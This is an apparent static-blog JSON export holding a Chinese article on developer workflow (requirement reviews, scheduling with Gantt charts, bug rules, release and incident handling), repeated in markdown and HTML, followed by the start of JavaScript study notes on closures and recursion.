第一手需求\n和产品做朋友，能比别人更快的拿到第一手需求。\n产品的需求并不是凭空而来，它可能是从竞品、客户需或老板提出的，产品往往是把需求具体化的人。他们更多的关注是需求是怎么实现的。以及联动的功能和异常场景。而开发则会把具体的需求通过编码实现。\n当然，正因为产品的角度更多的是怎么实现需求，也更容易过于关注需求实现，而把原本用户诉求无限放大，忽略了需求本身。\n开发拿到第一手需求最好的方式是如何实现需求出发，可以通过哪些方式来解决。也许需求可以不用开发，只需换个角度看问题就能轻松解决。\n\n核心思想:  why\n\n## 需求对齐和排期\n### 需求宣讲\n![discuss](discuss.png)\n需求宣讲是产品与开发、测试把方案内容输出的主要途径。一份需求的宣讲过程，大致可分为需求宣讲前、需求宣讲中、需求宣讲后。遵循一套流程能有效避免踩坑和高效率会议。\n\n#### 需求宣讲前：\n亚马逊的高管会议，会在开会前半小时阅读会议内容，再根据梳理的疑问进行讨论。\n阅读需求文档是必不可少的过程。有效的阅读文档，能在需求宣讲时更能提出自己的疑问与观点，能避免前期因为准备不足，导致的会议效率低下。这样的高效工作方式更值得作为打工人的我们借鉴。需求宣讲前可以从：\n- 看需求：了解需求的背景，和类似场景其他产品怎么实现的\n- 提疑问：融合 Why、How、What 去思考\n- 给方案：对现有的技术给需求的方案\n- 给排期：给出大概的排期，以 人/天 为单位进行估算\n\n#### 需求宣讲中：\n需求宣讲中主要是对齐方案，解决疑惑。作为开发者期望的是对所有异常场景与方案有大概的了解，且高效会议，一次通过。需求宣讲中围绕：\n- 提出疑问：提出会前准备的疑问，并发散出新的疑问\n- 确认需求：和产品、测试方沟通对齐表现和异常场景，最好有录屏作为证据\n- 一次通过：有不确定的点会中立马拉上相关同学对齐，争取一次性通过会议，不开第二次\n- 确认 deadline: 与估算的 人/天 进行匹配，有疑问可向负责人提出\n\n#### 需求宣讲后：\n会议后通常需要结论的沉淀。这样的好处是在不记得需求细节时可以翻看存档来确认细节、防止产品甩锅等。宣讲内容沉淀的方式：\n- 录像回放：有问题可将录像回放，找到讨论的地方\n- 会议纪要：将本次的结论、需要跟进的点写下来，发群里，并艾特相关同学\n\n会议纪要常用模版：\n经过与产品方、xx方的沟通，有以下结论与跟进事项：\n结论：\n1、xxx\n跟进事项：\n1、 xxxx @xxxx 同学\n辛苦 @xxxx 关注并确认\n\n核心思想: How\n\n### 目标拆解与甘特图\n有了具体的需求后，就来到了排期缓解。产品同学希望越快越好，而 PM（Project Manager） 会根据版本的时间点排期。也正因为二者的目标不同，会存在 PM 的排期与产品期望时间并不是相同时间点。为了保证需求不因为自己 delay，合理的人力估算和目标拆解变得必不可少。\n#### 目标拆解\n好的目标拆解通常会以大目标和小目标来进行拆分。大目标包括需求评审时间、开发时间、联调时间、测试时间、code review 时间、发布时间，以时间节点为颗粒；小目标包括开发进度、联调进度，以每天的事件为颗粒。\n评估做不完需求该怎么办？\n- 需求上：迭代处理，分成本期必保、本期冲刺、本期不做的几种类型\n- 人力上：评估加人能否解决\n- 时间上：deadline delay 还是需求 delay\n\n#### 需求拆分的小 tips\n将开发、联调事件拆解，细分到每周、每天的工作。让每天的进度可控，按时完成工作，按时回家。出现进度不可控则周末适当调整下。\n对目标拆解到具体内容：\n- 需求 deadline 倒推出需求开发完成、提测、发布时间点\n- 根据时间点定具体开发内容，每周目标、每日目标\n\n小目标拆解后，甘特图就更能显示工作内容和进度了。\n### 甘特图\n![gantt-chart](gantt-chart.png)\n\n甘特图能清晰的知道工作进度。个人使用甘特图能清晰的定好每天的目标，高效工作；多人合作使用甘特图能划分每个人的工作内容以及进度同步。\n使用甘特图的好处很多，它不仅能直观、定量的看到进度，还能知道预期目标和实际产出的差值，能有效知道进度快、慢的原因。更重要的是有沉淀，有利于需求完成后的回顾，及时几年后看到自己画的甘特图，也能很快的回忆起当时做需求的问题与困难，充当需求快照的作用。\n\n核心思想: When\n\n## 从方案设计到发布上线\n从方案设计到发布上线，基本属于开发和测试的工作。方案设计能具体量化需求方案，也能有效保证开发进度，这一环节必不可少。开发和测试的有效沟通也能帮助开发找到代码漏洞，避免发布上线后带来的事故，这些环节十分重要。\n### 方案设计\n方案设计有多香，体验过的人都知道。它的好处在于全局的思考需求，比较容易给出全局最优，而不仅仅是局部最优。方案设计不仅在开发阶段起着举足轻重的作用，还对后续维护有很大的便利。方案设计可以围绕这几点写：\n- 时间人物：标注需求关键的时间节点和参与方\n- 业内方案：例如业内实现和竞品分析等\n- 方案设计：方案的具体逻辑，包括设计稿、流程图、库表字段等\n- 其他：流程卡点、自我反思或结论留底等\n### 处理 bug 的规矩\n产品是开发的上游，测试是开发的下游。测试同学对产品形态的表现甚至比产品还更关心，多和测试同学沟通，也能让产品有更良好的发展。要和测试做朋友，从来一杯奶茶做起。当然立好规矩也能避免在需求测试过程中增加沟通成本。\n- 提单前：先沟通到底是开发原因还是其他原因，定好责任方与优先级\n- 提单时：必须包含复现路径及截图，最好包含账号信息和录屏\n- 提单后：非必要场景沟通能否降低优先级，不好解决的问题能否转成需求单\n### 发布条例\n流程的建立很大程度上是对人的保护，遵循流程能有效程度上保护自己。\n- 发布计划：列好发布计划，从 MR、代码到配置，使用发布标记记录每个发布时间点\n- 发布透明：需要发的功能、bugfix和压测接口明确知会\n- 做好灰度：发布的功能遵循一定规则灰度\n- 立刻验证：发布后的第一时间线上验证，保证发布功能正常\n- 留守保障：留守一定的时间，保证发布后无明显波动，方便有问题及时响应\n核心思想: 规矩\n\n## 事故与复盘\n在需求发布过程中，事故难免会发生。及时、正确的处理事故，在职场上是对自己的保护。同样能帮助自己更快的成长，减少相同错误的发生。\n### 透明原则\n事故发生后第一时间向上级汇报，并定时汇报进度，即便是自己闯出来的。遇到事故建议处理方式：\n- 事故发生时：\n1、大群里艾特相关同学及上级，并同时电话上级，确认信息同步完全\n2、能恢复立刻恢复\n3、每隔几分钟向上汇报，即使没有进度\n4、向上级寻求帮助，直到问题解决\n- 事故发生后：反思与沉淀\n\n### 处理事故的五要素\n- 定义问题：能不能量化指标，比如出现路径、指标数据灯\n- 发现问题：能不能有监控，及时和准确的告警\n- 分析问题：能不能有工具辅助，提升分析问题的效率\n- 解决问题：能不能第一时间修复，为用户解决问题\n- 预防问题：能不能补充相关case，保证犯过的错误不再犯\n\n## 最后\n写到这里基本完成了，每个点笔者都亲身经历过也实践过。从“年轻”到“老”程序员，磨平了很多冲动与莽撞，沉淀了各个流程的“最佳实践”。如今带小朋友一起干活，对我而言，也是个全新的阶段。这篇文章也算为上阶段的思考做沉淀吧，也希望帮助到有需要的人。\n感谢你阅读到这里。\n\n","slug":"the-skills-of-develop","published":1,"updated":"2021-10-13T15:51:42.907Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckuq8nz0800174jzxif3vfysp","content":"<p><img src=\"/img/loading.gif\" data-original=\"/需求开发/the-skills-of-develop/xmind.png\" alt=\"xmind\"></p><h2 id=\"写在前面\"><a href=\"#写在前面\" class=\"headerlink\" title=\"写在前面\"></a>写在前面</h2><p>你是不是接需求后手足无措？是不是天天忙碌，但又效率不高？是不是需求沟通前后不一致，导致重复修改？几年前刚踏入职场生活的我，对此深有体会。经过沉淀，终于搞明白怎么高效开发，高效会议，总结这几点经验：和产品做朋友、需求对齐和排期、需求方案设计与发布上线、事故与复盘。从此高效工作，早早下班。</p><h2 id=\"树立正确的观点\"><a href=\"#树立正确的观点\" class=\"headerlink\" title=\"树立正确的观点\"></a>树立正确的观点</h2><p>阅读之前，不妨问问自己，工作的目的是啥？<br>也许每个人有不同的观点。有人觉得事情永远都干不完，不如慢慢做，自己也更轻松。但有种高级的思维方式是：尽自己努力做好每件事情。因为只有好好对工作，升职加薪才会好好对你；只有对工作表现出热情，老板才会对你有信心，才更可能在职场激烈的竞争中脱颖而出。</p><h2 id=\"和产品做朋友\"><a href=\"#和产品做朋友\" class=\"headerlink\" title=\"和产品做朋友\"></a>和产品做朋友</h2><p>产品是一群有想象力，能把抽象的事情具体化的人。他们不仅有许多新颖的点子，还能迅速的 get 到你说的想法。和产品同学做朋友不仅能更加顺利的合作，还能开拓视野，增长见识。比如和产品一起坐电梯，他们可能会想为什么要装镜子，而你会想电梯系统是怎么实现的。在不同角度看同一件事情不仅十分有趣，还能扩展更多可能，不妨试试看。</p><h3 id=\"第一手需求\"><a href=\"#第一手需求\" class=\"headerlink\" title=\"第一手需求\"></a>第一手需求</h3><p>和产品做朋友，能比别人更快的拿到第一手需求。<br>产品的需求并不是凭空而来，它可能是从竞品、客户需或老板提出的，产品往往是把需求具体化的人。他们更多的关注是需求是怎么实现的。以及联动的功能和异常场景。而开发则会把具体的需求通过编码实现。<br>当然，正因为产品的角度更多的是怎么实现需求，也更容易过于关注需求实现，而把原本用户诉求无限放大，忽略了需求本身。<br>开发拿到第一手需求最好的方式是如何实现需求出发，可以通过哪些方式来解决。也许需求可以不用开发，只需换个角度看问题就能轻松解决。</p><p>核心思想: why</p><h2 id=\"需求对齐和排期\"><a href=\"#需求对齐和排期\" class=\"headerlink\" title=\"需求对齐和排期\"></a>需求对齐和排期</h2><h3 id=\"需求宣讲\"><a href=\"#需求宣讲\" class=\"headerlink\" title=\"需求宣讲\"></a>需求宣讲</h3><p><img src=\"/img/loading.gif\" data-original=\"/需求开发/the-skills-of-develop/discuss.png\" alt=\"discuss\"><br>需求宣讲是产品与开发、测试把方案内容输出的主要途径。一份需求的宣讲过程，大致可分为需求宣讲前、需求宣讲中、需求宣讲后。遵循一套流程能有效避免踩坑和高效率会议。</p><h4 id=\"需求宣讲前：\"><a href=\"#需求宣讲前：\" class=\"headerlink\" title=\"需求宣讲前：\"></a>需求宣讲前：</h4><p>亚马逊的高管会议，会在开会前半小时阅读会议内容，再根据梳理的疑问进行讨论。<br>阅读需求文档是必不可少的过程。有效的阅读文档，能在需求宣讲时更能提出自己的疑问与观点，能避免前期因为准备不足，导致的会议效率低下。这样的高效工作方式更值得作为打工人的我们借鉴。需求宣讲前可以从：</p><ul><li>看需求：了解需求的背景，和类似场景其他产品怎么实现的</li><li>提疑问：融合 Why、How、What 去思考</li><li>给方案：对现有的技术给需求的方案</li><li>给排期：给出大概的排期，以 人/天 为单位进行估算</li></ul><h4 id=\"需求宣讲中：\"><a href=\"#需求宣讲中：\" class=\"headerlink\" title=\"需求宣讲中：\"></a>需求宣讲中：</h4><p>需求宣讲中主要是对齐方案，解决疑惑。作为开发者期望的是对所有异常场景与方案有大概的了解，且高效会议，一次通过。需求宣讲中围绕：</p><ul><li>提出疑问：提出会前准备的疑问，并发散出新的疑问</li><li>确认需求：和产品、测试方沟通对齐表现和异常场景，最好有录屏作为证据</li><li>一次通过：有不确定的点会中立马拉上相关同学对齐，争取一次性通过会议，不开第二次</li><li>确认 deadline: 与估算的 人/天 进行匹配，有疑问可向负责人提出</li></ul><h4 id=\"需求宣讲后：\"><a href=\"#需求宣讲后：\" class=\"headerlink\" title=\"需求宣讲后：\"></a>需求宣讲后：</h4><p>会议后通常需要结论的沉淀。这样的好处是在不记得需求细节时可以翻看存档来确认细节、防止产品甩锅等。宣讲内容沉淀的方式：</p><ul><li>录像回放：有问题可将录像回放，找到讨论的地方</li><li>会议纪要：将本次的结论、需要跟进的点写下来，发群里，并艾特相关同学</li></ul><p>会议纪要常用模版：<br>经过与产品方、xx方的沟通，有以下结论与跟进事项：<br>结论：<br>1、xxx<br>跟进事项：<br>1、 xxxx @xxxx 同学<br>辛苦 @xxxx 关注并确认</p><p>核心思想: How</p><h3 id=\"目标拆解与甘特图\"><a href=\"#目标拆解与甘特图\" class=\"headerlink\" title=\"目标拆解与甘特图\"></a>目标拆解与甘特图</h3><p>有了具体的需求后，就来到了排期缓解。产品同学希望越快越好，而 PM（Project Manager） 会根据版本的时间点排期。也正因为二者的目标不同，会存在 PM 的排期与产品期望时间并不是相同时间点。为了保证需求不因为自己 delay，合理的人力估算和目标拆解变得必不可少。</p><h4 id=\"目标拆解\"><a href=\"#目标拆解\" class=\"headerlink\" title=\"目标拆解\"></a>目标拆解</h4><p>好的目标拆解通常会以大目标和小目标来进行拆分。大目标包括需求评审时间、开发时间、联调时间、测试时间、code review 时间、发布时间，以时间节点为颗粒；小目标包括开发进度、联调进度，以每天的事件为颗粒。<br>评估做不完需求该怎么办？</p><ul><li>需求上：迭代处理，分成本期必保、本期冲刺、本期不做的几种类型</li><li>人力上：评估加人能否解决</li><li>时间上：deadline delay 还是需求 delay</li></ul><h4 id=\"需求拆分的小-tips\"><a href=\"#需求拆分的小-tips\" class=\"headerlink\" title=\"需求拆分的小 tips\"></a>需求拆分的小 tips</h4><p>将开发、联调事件拆解，细分到每周、每天的工作。让每天的进度可控，按时完成工作，按时回家。出现进度不可控则周末适当调整下。<br>对目标拆解到具体内容：</p><ul><li>需求 deadline 倒推出需求开发完成、提测、发布时间点</li><li>根据时间点定具体开发内容，每周目标、每日目标</li></ul><p>小目标拆解后，甘特图就更能显示工作内容和进度了。</p><h3 id=\"甘特图\"><a href=\"#甘特图\" class=\"headerlink\" title=\"甘特图\"></a>甘特图</h3><p><img src=\"/img/loading.gif\" data-original=\"/需求开发/the-skills-of-develop/gantt-chart.png\" alt=\"gantt-chart\"></p><p>甘特图能清晰的知道工作进度。个人使用甘特图能清晰的定好每天的目标，高效工作；多人合作使用甘特图能划分每个人的工作内容以及进度同步。<br>使用甘特图的好处很多，它不仅能直观、定量的看到进度，还能知道预期目标和实际产出的差值，能有效知道进度快、慢的原因。更重要的是有沉淀，有利于需求完成后的回顾，及时几年后看到自己画的甘特图，也能很快的回忆起当时做需求的问题与困难，充当需求快照的作用。</p><p>核心思想: When</p><h2 id=\"从方案设计到发布上线\"><a href=\"#从方案设计到发布上线\" class=\"headerlink\" title=\"从方案设计到发布上线\"></a>从方案设计到发布上线</h2><p>从方案设计到发布上线，基本属于开发和测试的工作。方案设计能具体量化需求方案，也能有效保证开发进度，这一环节必不可少。开发和测试的有效沟通也能帮助开发找到代码漏洞，避免发布上线后带来的事故，这些环节十分重要。</p><h3 id=\"方案设计\"><a href=\"#方案设计\" class=\"headerlink\" title=\"方案设计\"></a>方案设计</h3><p>方案设计有多香，体验过的人都知道。它的好处在于全局的思考需求，比较容易给出全局最优，而不仅仅是局部最优。方案设计不仅在开发阶段起着举足轻重的作用，还对后续维护有很大的便利。方案设计可以围绕这几点写：</p><ul><li>时间人物：标注需求关键的时间节点和参与方</li><li>业内方案：例如业内实现和竞品分析等</li><li>方案设计：方案的具体逻辑，包括设计稿、流程图、库表字段等</li><li>其他：流程卡点、自我反思或结论留底等<h3 id=\"处理-bug-的规矩\"><a href=\"#处理-bug-的规矩\" class=\"headerlink\" title=\"处理 bug 的规矩\"></a>处理 bug 的规矩</h3>产品是开发的上游，测试是开发的下游。测试同学对产品形态的表现甚至比产品还更关心，多和测试同学沟通，也能让产品有更良好的发展。要和测试做朋友，从来一杯奶茶做起。当然立好规矩也能避免在需求测试过程中增加沟通成本。</li><li>提单前：先沟通到底是开发原因还是其他原因，定好责任方与优先级</li><li>提单时：必须包含复现路径及截图，最好包含账号信息和录屏</li><li>提单后：非必要场景沟通能否降低优先级，不好解决的问题能否转成需求单<h3 id=\"发布条例\"><a href=\"#发布条例\" class=\"headerlink\" title=\"发布条例\"></a>发布条例</h3>流程的建立很大程度上是对人的保护，遵循流程能有效程度上保护自己。</li><li>发布计划：列好发布计划，从 MR、代码到配置，使用发布标记记录每个发布时间点</li><li>发布透明：需要发的功能、bugfix和压测接口明确知会</li><li>做好灰度：发布的功能遵循一定规则灰度</li><li>立刻验证：发布后的第一时间线上验证，保证发布功能正常</li><li>留守保障：留守一定的时间，保证发布后无明显波动，方便有问题及时响应<br>核心思想: 规矩</li></ul><h2 id=\"事故与复盘\"><a href=\"#事故与复盘\" class=\"headerlink\" title=\"事故与复盘\"></a>事故与复盘</h2><p>在需求发布过程中，事故难免会发生。及时、正确的处理事故，在职场上是对自己的保护。同样能帮助自己更快的成长，减少相同错误的发生。</p><h3 id=\"透明原则\"><a href=\"#透明原则\" class=\"headerlink\" title=\"透明原则\"></a>透明原则</h3><p>事故发生后第一时间向上级汇报，并定时汇报进度，即便是自己闯出来的。遇到事故建议处理方式：</p><ul><li>事故发生时：<br>1、大群里艾特相关同学及上级，并同时电话上级，确认信息同步完全<br>2、能恢复立刻恢复<br>3、每隔几分钟向上汇报，即使没有进度<br>4、向上级寻求帮助，直到问题解决</li><li>事故发生后：反思与沉淀</li></ul><h3 id=\"处理事故的五要素\"><a href=\"#处理事故的五要素\" class=\"headerlink\" title=\"处理事故的五要素\"></a>处理事故的五要素</h3><ul><li>定义问题：能不能量化指标，比如出现路径、指标数据灯</li><li>发现问题：能不能有监控，及时和准确的告警</li><li>分析问题：能不能有工具辅助，提升分析问题的效率</li><li>解决问题：能不能第一时间修复，为用户解决问题</li><li>预防问题：能不能补充相关case，保证犯过的错误不再犯</li></ul><h2 id=\"最后\"><a href=\"#最后\" class=\"headerlink\" title=\"最后\"></a>最后</h2><p>写到这里基本完成了，每个点笔者都亲身经历过也实践过。从“年轻”到“老”程序员，磨平了很多冲动与莽撞，沉淀了各个流程的“最佳实践”。如今带小朋友一起干活，对我而言，也是个全新的阶段。这篇文章也算为上阶段的思考做沉淀吧，也希望帮助到有需要的人。<br>感谢你阅读到这里。</p>","site":{"data":{}},"excerpt":"","more":"<p><img src=\"/需求开发/the-skills-of-develop/xmind.png\" alt=\"xmind\"></p><h2 id=\"写在前面\"><a href=\"#写在前面\" class=\"headerlink\" title=\"写在前面\"></a>写在前面</h2><p>你是不是接需求后手足无措？是不是天天忙碌，但又效率不高？是不是需求沟通前后不一致，导致重复修改？几年前刚踏入职场生活的我，对此深有体会。经过沉淀，终于搞明白怎么高效开发，高效会议，总结这几点经验：和产品做朋友、需求对齐和排期、需求方案设计与发布上线、事故与复盘。从此高效工作，早早下班。</p><h2 id=\"树立正确的观点\"><a href=\"#树立正确的观点\" class=\"headerlink\" title=\"树立正确的观点\"></a>树立正确的观点</h2><p>阅读之前，不妨问问自己，工作的目的是啥？<br>也许每个人有不同的观点。有人觉得事情永远都干不完，不如慢慢做，自己也更轻松。但有种高级的思维方式是：尽自己努力做好每件事情。因为只有好好对工作，升职加薪才会好好对你；只有对工作表现出热情，老板才会对你有信心，才更可能在职场激烈的竞争中脱颖而出。</p><h2 id=\"和产品做朋友\"><a href=\"#和产品做朋友\" class=\"headerlink\" title=\"和产品做朋友\"></a>和产品做朋友</h2><p>产品是一群有想象力，能把抽象的事情具体化的人。他们不仅有许多新颖的点子，还能迅速的 get 到你说的想法。和产品同学做朋友不仅能更加顺利的合作，还能开拓视野，增长见识。比如和产品一起坐电梯，他们可能会想为什么要装镜子，而你会想电梯系统是怎么实现的。在不同角度看同一件事情不仅十分有趣，还能扩展更多可能，不妨试试看。</p><h3 id=\"第一手需求\"><a href=\"#第一手需求\" class=\"headerlink\" title=\"第一手需求\"></a>第一手需求</h3><p>和产品做朋友，能比别人更快的拿到第一手需求。<br>产品的需求并不是凭空而来，它可能是从竞品、客户需或老板提出的，产品往往是把需求具体化的人。他们更多的关注是需求是怎么实现的。以及联动的功能和异常场景。而开发则会把具体的需求通过编码实现。<br>当然，正因为产品的角度更多的是怎么实现需求，也更容易过于关注需求实现，而把原本用户诉求无限放大，忽略了需求本身。<br>开发拿到第一手需求最好的方式是如何实现需求出发，可以通过哪些方式来解决。也许需求可以不用开发，只需换个角度看问题就能轻松解决。</p><p>核心思想: why</p><h2 id=\"需求对齐和排期\"><a href=\"#需求对齐和排期\" class=\"headerlink\" title=\"需求对齐和排期\"></a>需求对齐和排期</h2><h3 id=\"需求宣讲\"><a href=\"#需求宣讲\" class=\"headerlink\" title=\"需求宣讲\"></a>需求宣讲</h3><p><img src=\"/需求开发/the-skills-of-develop/discuss.png\" alt=\"discuss\"><br>需求宣讲是产品与开发、测试把方案内容输出的主要途径。一份需求的宣讲过程，大致可分为需求宣讲前、需求宣讲中、需求宣讲后。遵循一套流程能有效避免踩坑和高效率会议。</p><h4 id=\"需求宣讲前：\"><a href=\"#需求宣讲前：\" class=\"headerlink\" title=\"需求宣讲前：\"></a>需求宣讲前：</h4><p>亚马逊的高管会议，会在开会前半小时阅读会议内容，再根据梳理的疑问进行讨论。<br>阅读需求文档是必不可少的过程。有效的阅读文档，能在需求宣讲时更能提出自己的疑问与观点，能避免前期因为准备不足，导致的会议效率低下。这样的高效工作方式更值得作为打工人的我们借鉴。需求宣讲前可以从：</p><ul><li>看需求：了解需求的背景，和类似场景其他产品怎么实现的</li><li>提疑问：融合 Why、How、What 去思考</li><li>给方案：对现有的技术给需求的方案</li><li>给排期：给出大概的排期，以 人/天 为单位进行估算</li></ul><h4 id=\"需求宣讲中：\"><a href=\"#需求宣讲中：\" class=\"headerlink\" title=\"需求宣讲中：\"></a>需求宣讲中：</h4><p>需求宣讲中主要是对齐方案，解决疑惑。作为开发者期望的是对所有异常场景与方案有大概的了解，且高效会议，一次通过。需求宣讲中围绕：</p><ul><li>提出疑问：提出会前准备的疑问，并发散出新的疑问</li><li>确认需求：和产品、测试方沟通对齐表现和异常场景，最好有录屏作为证据</li><li>一次通过：有不确定的点会中立马拉上相关同学对齐，争取一次性通过会议，不开第二次</li><li>确认 deadline: 与估算的 人/天 进行匹配，有疑问可向负责人提出</li></ul><h4 id=\"需求宣讲后：\"><a href=\"#需求宣讲后：\" class=\"headerlink\" title=\"需求宣讲后：\"></a>需求宣讲后：</h4><p>会议后通常需要结论的沉淀。这样的好处是在不记得需求细节时可以翻看存档来确认细节、防止产品甩锅等。宣讲内容沉淀的方式：</p><ul><li>录像回放：有问题可将录像回放，找到讨论的地方</li><li>会议纪要：将本次的结论、需要跟进的点写下来，发群里，并艾特相关同学</li></ul><p>会议纪要常用模版：<br>经过与产品方、xx方的沟通，有以下结论与跟进事项：<br>结论：<br>1、xxx<br>跟进事项：<br>1、 xxxx @xxxx 同学<br>辛苦 @xxxx 关注并确认</p><p>核心思想: How</p><h3 id=\"目标拆解与甘特图\"><a href=\"#目标拆解与甘特图\" class=\"headerlink\" title=\"目标拆解与甘特图\"></a>目标拆解与甘特图</h3><p>有了具体的需求后，就来到了排期缓解。产品同学希望越快越好，而 PM（Project Manager） 会根据版本的时间点排期。也正因为二者的目标不同，会存在 PM 的排期与产品期望时间并不是相同时间点。为了保证需求不因为自己 delay，合理的人力估算和目标拆解变得必不可少。</p><h4 id=\"目标拆解\"><a href=\"#目标拆解\" class=\"headerlink\" title=\"目标拆解\"></a>目标拆解</h4><p>好的目标拆解通常会以大目标和小目标来进行拆分。大目标包括需求评审时间、开发时间、联调时间、测试时间、code review 时间、发布时间，以时间节点为颗粒；小目标包括开发进度、联调进度，以每天的事件为颗粒。<br>评估做不完需求该怎么办？</p><ul><li>需求上：迭代处理，分成本期必保、本期冲刺、本期不做的几种类型</li><li>人力上：评估加人能否解决</li><li>时间上：deadline delay 还是需求 delay</li></ul><h4 id=\"需求拆分的小-tips\"><a href=\"#需求拆分的小-tips\" class=\"headerlink\" title=\"需求拆分的小 tips\"></a>需求拆分的小 tips</h4><p>将开发、联调事件拆解，细分到每周、每天的工作。让每天的进度可控，按时完成工作，按时回家。出现进度不可控则周末适当调整下。<br>对目标拆解到具体内容：</p><ul><li>需求 deadline 倒推出需求开发完成、提测、发布时间点</li><li>根据时间点定具体开发内容，每周目标、每日目标</li></ul><p>小目标拆解后，甘特图就更能显示工作内容和进度了。</p><h3 id=\"甘特图\"><a href=\"#甘特图\" class=\"headerlink\" title=\"甘特图\"></a>甘特图</h3><p><img src=\"/需求开发/the-skills-of-develop/gantt-chart.png\" alt=\"gantt-chart\"></p><p>甘特图能清晰的知道工作进度。个人使用甘特图能清晰的定好每天的目标，高效工作；多人合作使用甘特图能划分每个人的工作内容以及进度同步。<br>使用甘特图的好处很多，它不仅能直观、定量的看到进度，还能知道预期目标和实际产出的差值，能有效知道进度快、慢的原因。更重要的是有沉淀，有利于需求完成后的回顾，及时几年后看到自己画的甘特图，也能很快的回忆起当时做需求的问题与困难，充当需求快照的作用。</p><p>核心思想: When</p><h2 id=\"从方案设计到发布上线\"><a href=\"#从方案设计到发布上线\" class=\"headerlink\" title=\"从方案设计到发布上线\"></a>从方案设计到发布上线</h2><p>从方案设计到发布上线，基本属于开发和测试的工作。方案设计能具体量化需求方案，也能有效保证开发进度，这一环节必不可少。开发和测试的有效沟通也能帮助开发找到代码漏洞，避免发布上线后带来的事故，这些环节十分重要。</p><h3 id=\"方案设计\"><a href=\"#方案设计\" class=\"headerlink\" title=\"方案设计\"></a>方案设计</h3><p>方案设计有多香，体验过的人都知道。它的好处在于全局的思考需求，比较容易给出全局最优，而不仅仅是局部最优。方案设计不仅在开发阶段起着举足轻重的作用，还对后续维护有很大的便利。方案设计可以围绕这几点写：</p><ul><li>时间人物：标注需求关键的时间节点和参与方</li><li>业内方案：例如业内实现和竞品分析等</li><li>方案设计：方案的具体逻辑，包括设计稿、流程图、库表字段等</li><li>其他：流程卡点、自我反思或结论留底等<h3 id=\"处理-bug-的规矩\"><a href=\"#处理-bug-的规矩\" class=\"headerlink\" title=\"处理 bug 的规矩\"></a>处理 bug 的规矩</h3>产品是开发的上游，测试是开发的下游。测试同学对产品形态的表现甚至比产品还更关心，多和测试同学沟通，也能让产品有更良好的发展。要和测试做朋友，从来一杯奶茶做起。当然立好规矩也能避免在需求测试过程中增加沟通成本。</li><li>提单前：先沟通到底是开发原因还是其他原因，定好责任方与优先级</li><li>提单时：必须包含复现路径及截图，最好包含账号信息和录屏</li><li>提单后：非必要场景沟通能否降低优先级，不好解决的问题能否转成需求单<h3 id=\"发布条例\"><a href=\"#发布条例\" class=\"headerlink\" title=\"发布条例\"></a>发布条例</h3>流程的建立很大程度上是对人的保护，遵循流程能有效程度上保护自己。</li><li>发布计划：列好发布计划，从 MR、代码到配置，使用发布标记记录每个发布时间点</li><li>发布透明：需要发的功能、bugfix和压测接口明确知会</li><li>做好灰度：发布的功能遵循一定规则灰度</li><li>立刻验证：发布后的第一时间线上验证，保证发布功能正常</li><li>留守保障：留守一定的时间，保证发布后无明显波动，方便有问题及时响应<br>核心思想: 规矩</li></ul><h2 id=\"事故与复盘\"><a href=\"#事故与复盘\" class=\"headerlink\" title=\"事故与复盘\"></a>事故与复盘</h2><p>在需求发布过程中，事故难免会发生。及时、正确的处理事故，在职场上是对自己的保护。同样能帮助自己更快的成长，减少相同错误的发生。</p><h3 id=\"透明原则\"><a href=\"#透明原则\" class=\"headerlink\" title=\"透明原则\"></a>透明原则</h3><p>事故发生后第一时间向上级汇报，并定时汇报进度，即便是自己闯出来的。遇到事故建议处理方式：</p><ul><li>事故发生时：<br>1、大群里艾特相关同学及上级，并同时电话上级，确认信息同步完全<br>2、能恢复立刻恢复<br>3、每隔几分钟向上汇报，即使没有进度<br>4、向上级寻求帮助，直到问题解决</li><li>事故发生后：反思与沉淀</li></ul><h3 id=\"处理事故的五要素\"><a href=\"#处理事故的五要素\" class=\"headerlink\" title=\"处理事故的五要素\"></a>处理事故的五要素</h3><ul><li>定义问题：能不能量化指标，比如出现路径、指标数据灯</li><li>发现问题：能不能有监控，及时和准确的告警</li><li>分析问题：能不能有工具辅助，提升分析问题的效率</li><li>解决问题：能不能第一时间修复，为用户解决问题</li><li>预防问题：能不能补充相关case，保证犯过的错误不再犯</li></ul><h2 id=\"最后\"><a href=\"#最后\" class=\"headerlink\" title=\"最后\"></a>最后</h2><p>写到这里基本完成了，每个点笔者都亲身经历过也实践过。从“年轻”到“老”程序员，磨平了很多冲动与莽撞，沉淀了各个流程的“最佳实践”。如今带小朋友一起干活，对我而言，也是个全新的阶段。这篇文章也算为上阶段的思考做沉淀吧，也希望帮助到有需要的人。<br>感谢你阅读到这里。</p>"},{"title":"JavaScript高级程序设计重读---7章","date":"2017-07-13T08:01:13.000Z","dir":"javascript","keywords":"JavaScript高级程序设计","_content":"### 函数表达式\n函数表达式和函数声明中，有以下因为函数声明有函数声明提升器，因此大多数用函数声明，但是函数表达式也有其运用场景\n```\n// 这种情况可能造成意想不到的情况\nif(condition){\n    function sayHi(){\n        alert('hi')\n    }\n}else {\n    function sayHi(){\n        alert('hello')\n    }\n}\n// 应该这样\nvar sayHi\nif(condition){\n    sayHi = function (){\n        alert('hi')\n    }\n}else {\n    sayHi = function (){\n        alert('hello')\n    }\n}\n\n```\n#### 递归\n```\nfunction factorial(num){\n    if(num <= 1){        \n        return 1\n    }else {\n        return num* factorial(num-1)\n    }\n}\n// 但是以下情况会出错\nvar another = factorial\nfactorial = null\nalert(another(4))   // 出错，因为factorial变量设置位null，结果现在factorial已经不再是函数\n//通过以下一种情况解决\nfunction factorial(num){\n    if(num <= 1){        \n        return 1\n    }else {\n        return num* arguments.callee(num-1)\n    }\n}\n// 上种情况在严格模式下有问题。这种情况可以代替函数名，在严格模式下依然可以生效\nvar factorail = (function f(num){\n    if(num <= 1){\n        return 1\n    }else{\n        return num * f(num -1)\n    }\n})\n```\n#### 闭包\n闭包（closure）是Javascript语言的一个难点，也是它的特色，很多高级应用都要依靠闭包实现。\n首先理解活动对象。活动对象是c语言里面称之为形参。在内存中，形参往往是在当前环境作用域的首位，其次是上一个环境，以此类推。因此其作用域链是由当前环境依次向上。\n正常函数是执行完成之后，函数内参数和变量将会清除。因此无法访问该变量。闭包是一种将当前函数返回，导致当前活动对象无法被销毁，到函数外即可取到变量。上代码\n```\nfunction create(){\n    var result = new Array();\n    for(var i = 0;i < 10; i++){\n        result[i] = function (num){\n            return function(){\n                return num\n            }\n        }(i)\n    }\n    return result\n}\n```\n此函数可以获取到i的值。通过访问不同的result函数以达到目的\n因此可以模仿块级作用域。\n```\n(function(){\n// 这里是块级作用域\n}())\n```\n#### 